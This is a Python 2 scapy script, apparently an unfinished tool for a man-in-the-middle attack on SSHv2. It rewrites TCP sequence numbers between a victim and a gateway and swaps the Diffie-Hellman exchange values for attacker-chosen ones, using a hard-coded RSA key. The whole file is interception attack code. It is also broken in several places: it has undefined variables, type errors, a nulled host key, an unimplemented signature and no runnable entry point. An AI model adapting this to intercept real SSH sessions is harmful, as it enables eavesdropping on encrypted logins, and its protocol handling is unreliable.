from scapy.all import *
import sys, os, time, binascii

KEX_INIT = 20
DH_GEX_REQ = 34
DH_GEX_GROUP = 31
DH_GEX_INIT = 32
DH_GEX_REPLY = 33
NEW_KEYS = 21

# Pretender
# ===========
# This class creates fake client and server to conduct MITM attack on SSHv2

class Pretender:

	def __init__ (self, victim_mac, gateway_mac):

		self.fake_client = {
			"src": victim_mac,
			"V_C": None, # client identification string
			"seq": None,
			"ack": None,
			"plen": None, # payload_len
			"expected_ack": None, # expected ack number
			"I_C": None, # kex init payload
			"min": None, # min size in bits for group (p, g)
			"n": None, # preferred size in bits for group (p, g)
			"max": None, # max size in bits for group (p, g)
			"secret_key": 2,
			"shared_key": None
		}

		self.fake_server = {
			"src": gateway_mac,
			"V_S": None, # server identification string
			"seq": None,
			"ack": None,
			"plen": None, # payload_len
			"expected_ack": None, # expected ack number
			"I_S": None, # kex init payload
			"secret_key": 3,
			"shared_key": None,
			"rsa_key": { # host key
				"e": 17,
				"d": 1568560811924611620106661755841468201717266394322268318493735523557050947635521634054955259339742269231556293406475766851897996062431769825767853143824929966759858765700214857764311433090038033144845961217006964801861386480535545362681406650697069715408566074125040809141061726147938528584071292888869029407534694760047538661262148496439488258430130059697770770893870812353110668027652660354970935553815086333119458148628076519005675402655104323726416001367554618380026165917491156534788119170894578997653370461894320526613513878872419509503539350843411737469252367486159616684412148864388410200614039197149961327457,
				"n": 23702696713527464481611777643826630603727581069758721257238670133750992097603438025719323918911660957276850655920078254650903051610080077367158669728910052831037865792803246739549594988916130278633227858390327468117016506816981574369407922721644609032840554009000616671464932750679959987492632870320687555491944107804209665062682235326172904265712696651613697808566180637187870437952158871006266578407390174661746872919818056787008007653132480912706351863850469608163111923270554588022880288337327962610044065388551056507591398945990958099911416158226155464950971930600769984333532821303973774429764427891704713733977
			},
			"certificate": None
		}

		# DH
		self.p = None
		self.g = None
		self.e = None
		self.f = None
		# Algorithms
		self.rsa = None
		self.hash = None
		self.aes = None

	#enddef

	def process (self, packet):
		# Make sure TCP sequence and ack numbers are correct
		if packet.haslayer(TCP):
			if packet[Ether].src == self.fake_client["src"]:
				# packet from client
				# initialization
				if self.fake_client["seq"] == None and packet[TCP].seq != 0:
					self.fake_client["seq"] = packet[TCP].seq
					self.fake_client["expected_ack"] = self.fake_client["seq"] + 1
					return
				#endif
				self.fake_client["seq"] = packet[TCP].seq
				self.fake_client["ack"] = packet[TCP].ack
				self.fake_client["plen"] = 0
				if packet.haslayer(Raw):
					self.fake_client["plen"] = len(packet[Raw].load)
					if packet[TCP].dport == 22 or packet[TCP].sport == 22:
						old_len = len(packet[Raw].load)
						new_payload = self.parseSSH(packet[Raw].load,True) # True: from client
						diff_len = old_len - len(new_payload)
						packet[IP].len = packet[IP].len - diff_len
						del packet[TCP].chksum
						del packet[IP].chksum
					#endif
				#endif
				# expected ack
				assigned_ack = ""
				self.fake_client["expected_ack"] = self.fake_client["seq"] + self.fake_client["plen"]
				if self.fake_server["expected_ack"] != None and self.fake_server["expected_ack"] != self.fake_client["ack"]:
					packet[TCP].ack = self.fake_server["expected_ack"]
					assigned_ack = " >> " + str(self.fake_server["expected_ack"])
				#endif
				# expected seq from client to server
				assigned_seq = ""
				if self.fake_server["ack"] != None and self.fake_client["seq"] != self.fake_server["ack"]:
					packet[TCP].seq = self.fake_server["ack"]
					assigned_seq = " >> " + str(self.fake_server["ack"])
				#endif
				print "From client:"
				print "SEQ: " + str(self.fake_client["seq"]) + assigned_seq
				print "ACK: " + str(self.fake_client["ack"]) + assigned_ack
				print "LEN: " + str(self.fake_client["plen"])
				print "ECK: " + str(self.fake_client["expected_ack"])
				print " "
			elif EX.get(packet[Ether].src) == victimMAC:
				# packet from server
				# initialization
				if self.fake_server["seq"] == None and packet[TCP].seq != 0:
					self.fake_server["seq"] = packet[TCP].seq
					self.fake_server["expected_ack"] = self.fake_server["seq"] + 1
					return
				#endif
				self.fake_server["seq"] = packet[TCP].seq
				self.fake_server["ack"] = packet[TCP].ack
				self.fake_server["plen"] = 0
				if packet.haslayer(Raw):
					self.fake_server["plen"] = len(packet[Raw].load)
					if packet[TCP].dport == 22 or packet[TCP].sport == 22:
						old_len = len(packet[Raw].load)
						new_payload = self.parseSSH(packet[Raw].load,False) # False: from server
						diff_len = old_len - len(new_payload)
						packet[IP].len = packet[IP].len - diff_len
						del packet[TCP].chksum
						del packet[IP].chksum
					#endif
				#endif
				# expected ack
				assigned_ack = ""
				self.fake_server["expected_ack"] = self.fake_server["seq"] + self.fake_server["plen"]
				if self.fake_client["expected_ack"] != None and self.fake_client["expected_ack"] != self.fake_server["ack"]:
					packet[TCP].ack = self.fake_client["expected_ack"]
					assigned_ack = " >> " + str(self.fake_client["expected_ack"])
				#endif
				# expected seq from server to client
				assigned_seq = ""
				if self.fake_client["ack"] != None and self.fake_server["seq"] != self.fake_client["ack"]:
					packet[TCP].seq = self.fake_client["ack"]
					assigned_seq = " >> " + str(self.fake_client["ack"])
				#endif
				print "From server:"
				print "SEQ: " + str(self.fake_server["seq"]) + assigned_seq
				print "ACK: " + str(self.fake_server["ack"]) + assigned_ack
				print "LEN: " + str(self.fake_server["plen"])
				print "ECK: " + str(self.fake_server["expected_ack"])
				print " "
			#endif
		#endif
	#enddef

	def parseSSH (self, raw, from_client):
		payload = SSH(raw)
		if payload == None:
			return
		#endif

		if payload.SSH_MSG_KEXINIT == KEX_INIT:
			if from_client:
				self.fake_client["I_C"] = raw
			else:
				self.fake_server["I_S"] = raw
			#endif
		elif payload.SSH_MSG_KEXINIT == DH_GEX_REQ:
			if from_client:
				self.fake_client["max"] = int(binascii.hexlify(payload.max),16)
				self.fake_client["n"] = int(binascii.hexlify(payload.n),16)
				self.fake_client["min"] = int(binascii.hexlify(payload.min),16)
			else:
				return
			#endif
		elif payload.SSH_MSG_KEXINIT == DH_GEX_GROUP:
			if from_client:
				return
			else:
				# P and G
				self.p = int(binascii.hexlify(payload.modulus),16)
				self.g = int(binascii.hexlify(payload.base),16)
			#endif
		elif payload.SSH_MSG_KEXINIT == DH_GEX_INIT:
			if from_client:
				# E
				self.e = int(binascii.hexlify(payload.e),16)
				e_len = len(payload.e)
				fake_e  = (self.g**self.fake_client["secret_key"]) % self.p
				payload.e = int_to_hex(fake_e, e_len)
			else:
				return
			#endif
		elif payload.SSH_MSG_KEXINIT == DH_GEX_REPLY:
			if from_client:
				return
			else:
				# Host key
				host_len = len(payload.host_key)
				payload.host_key = None
				# F
				self.f = int(binascii.hexlify(payload.f),16)
				f_len = len(payload.f)
				fake_f = (self.g**self.fake_server["secret_key"]) % self.p
				payload.f = int_to_hex(fake_f, f_len)
				# Signature
				fake_sig = None
				# Shared key
				self.fake_server["shared_key"] = (self.e**self.fake_server["secret_key"]) % self.p
				self.fake_client["shared_key"] = (self.f**self.fake_client["secret_key"]) % self.p
			#endif
		#endif

		new_payload = payload.reconstruct()
		return new_payload
	#enddef

#endclass

# SSH
# =====
# This class parses SSH payload

class SSH:

	def __init__ (self, payload):

		if payload[0:2] == "SSH":
			# This is SSH protocal
			return None
		#endif
		if len(payload) % 2 != 0 or len(payload) < 6:
			print "\nPayload length error: " + str(len(payload))
			return None
		#endif

		self.packet_len = int(binascii.hexlify(payload[0:4]), 16)
		self.padding_len = int(binascii.hexlify(payload[4:5]), 16)
		self.SSH_MSG_KEXINIT = ord(payload[5:6])

		if self.SSH_MSG_KEXINIT == KEX_INIT:
			# Algorithm negotiation
			# Cookie
			self.cookie = payload[6:22]
			# Key exchange algorithms
			kex_algorithms_len = int(binascii.hexlify(payload[22:26]), 16)
			self.kex_algorithms = payload[26:26+kex_algorithms_len]
			rest = payload[26+kex_algorithms_len:]
			# Host key algorithms
			pub_key_algorithms_len = int(binascii.hexlify(rest[0:4]), 16)
			self.pub_key_algorithms = rest[4:4+pub_key_algorithms_len]
			rest = rest[4+pub_key_algorithms_len:]
			# Symmetric key algorithms
				# client to host (ch)
			sym_key_algorithms_ch_len = int(binascii.hexlify(rest[0:4]), 16)
			self.sym_key_algorithms_ch = rest[4:4+sym_key_algorithms_ch_len]
			rest = rest[4+sym_key_algorithms_ch_len:]
				# host to client (hc)
			sym_key_algorithms_hc_len = int(binascii.hexlify(rest[0:4]), 16)
			self.sym_key_algorithms_hc = rest[4:4+sym_key_algorithms_hc_len]
			rest = rest[4+sym_key_algorithms_hc_len:]
			# MAC algorithms
				# client to host (ch)
			mac_algorithms_ch_len = int(binascii.hexlify(rest[0:4]), 16)
			self.mac_algorithms_ch = rest[4:4+mac_algorithms_ch_len]
			rest = rest[4+mac_algorithms_ch_len:]
				# host to client (hc)
			mac_algorithms_hc_len = int(binascii.hexlify(rest[0:4]), 16)
			self.mac_algorithms_hc = rest[4:4+mac_algorithms_hc_len]
			rest = rest[4+mac_algorithms_hc_len:]
			# rest
			self.rest = rest[0:-self.padding_len]
		elif self.SSH_MSG_KEXINIT == DH_GEX_REQ:
			# Client specifies min, max bits requirement for P
			# Min
			self.min = payload[6:10]
			rest = payload[10:]
			# N
			self.n = rest[0:4]
			rest = rest[4:]
			# Max
			self.max = rest[0:4]
			rest = rest[4:]
			# rest
			self.rest = rest[0:-self.padding_len]
		elif self.SSH_MSG_KEXINIT == DH_GEX_GROUP:
			# Server sends P and G
			# P
			p_len = int(payload[6:10],16)
			self.modulus = payload[10:10+p_len]
			rest = payload[10+p_len:]
			# G
			g_len = int(rest[0:1],16)
			self.base = rest[1:1+g_len]
			rest = rest[1+g_len:]
			# rest
			self.rest = rest[0:-self.padding_len]
		elif self.SSH_MSG_KEXINIT == DH_GEX_INIT:
			# Client sends E
			# E
			e_len = int(payload[6:10],16)
			self.e = payload[10:10+e_len]
			rest = payload[10+e_len:]
			# rest
			self.rest = rest[0:-self.padding_len]
		elif self.SSH_MSG_KEXINIT == DH_GEX_REPLY:
			# Server replies with host key, f, signature
			# Host key
			host_len = int(payload[6:10],16)
			self.host_key = payload[10:10+host_len]
			rest = payload[10+host_len:]
			# F
			f_len = int(rest[0:4],16)
			self.f = rest[4:4+f_len]
			rest = rest[4+f_len:]
			# Signature
			sig_len = int(rest[0:4],16)
			self.signature = rest[4:4+sig_len]
			rest = rest[4+sig_len:]
			# rest
			self.rest = rest[0:-self.padding_len]
		#endif
	#enddef

	def reconstruct (self):
		# SSH_MSG_KEXINIT must exist
		payload = chr(self.SSH_MSG_KEXINIT)
		# Codes
		if self.SSH_MSG_KEXINIT == KEX_INIT:
			# Cookie
			payload = payload + self.cookie
			# Key exchange
			payload = payload + len_to_hex(self.kex_algorithms,4) + self.kex_algorithms
			# Host key
			payload = payload + len_to_hex(self.pub_key_algorithms,4) + self.pub_key_algorithms
			# Symmetric key
			payload = payload + len_to_hex(self.sym_key_algorithms_ch,4) + self.sym_key_algorithms_ch
			payload = payload + len_to_hex(self.sym_key_algorithms_hc,4) + self.sym_key_algorithms_hc
			# MAC
			payload = payload + len_to_hex(self.mac_algorithms_ch,4) + self.mac_algorithms_ch
			payload = payload + len_to_hex(self.mac_algorithms_hc,4) + self.mac_algorithms_hc
		elif self.SSH_MSG_KEXINIT == DH_GEX_REQ:
			# Max
			payload = payload + self.min
			# N
			payload = payload + self.n
			# Min
			payload = payload + self.max
		elif self.SSH_MSG_KEXINIT == DH_GEX_GROUP:
			# P
			payload = payload + len_to_hex(len(self.modulus),4) + self.modulus
			# G
			payload = payload + len_to_hex(len(self.base),4) + self.base
		elif self.SSH_MSG_KEXINIT == DH_GEX_INIT:
			# E
			payload = payload + len_to_hex(len(self.e),4) + self.e
		elif self.SSH_MSG_KEXINIT == DH_GEX_REPLY:
			# Host key
			payload = payload + len_to_hex(len(self.host_key),4) + self.host_key
			# F
			payload = payload + len_to_hex(len(self.f),4) + self.f
			# Signature
			payload = payload + len_to_hex(len(self.signature),4) + self.signature
		#endif

		# rest
		payload = payload + self.rest
		# Padding
		padding_len = get_padlen(len(payload))
		# Packet len
		packet_len = 1 + len(payload) + padding_len
		packet = len_to_hex(packet_len,4) + len_to_hex(padding_len,1) + payload + chr(0) * padding_len
		return packet
	#enddef

#endclass

#
# Utilities
#
def replace_payload (old, new):
	# This is stupid!
	old_len = len(old)
	return new + "x" * (old_len - len(new))
#enddef

def to_hex (ch):
	return "{0:02x}".format(ord(ch))
#enddef

def len_to_hex (s, num_of_bytes):
	# A quick way to turn the length of string into binary data with a specified number of bytes
	return binascii.unhexlify("{0:0{1}x}".format(len(s),num_of_bytes*2))
#enddef

def int_to_hex (i, num_of_bytes):
	# Turn an integer into binary data with a speicifed number of bytes
	return binascii.unhexlify("{0:0{1}x}".format(i,num_of_bytes*2))
#enddef

def get_padlen (payload_len):
	for x in range(4,256):
		if (4 + 1 + payload_len + x) % 8 == 0:
			return x
		#endif
	#endfor
#enddef

print "Hello"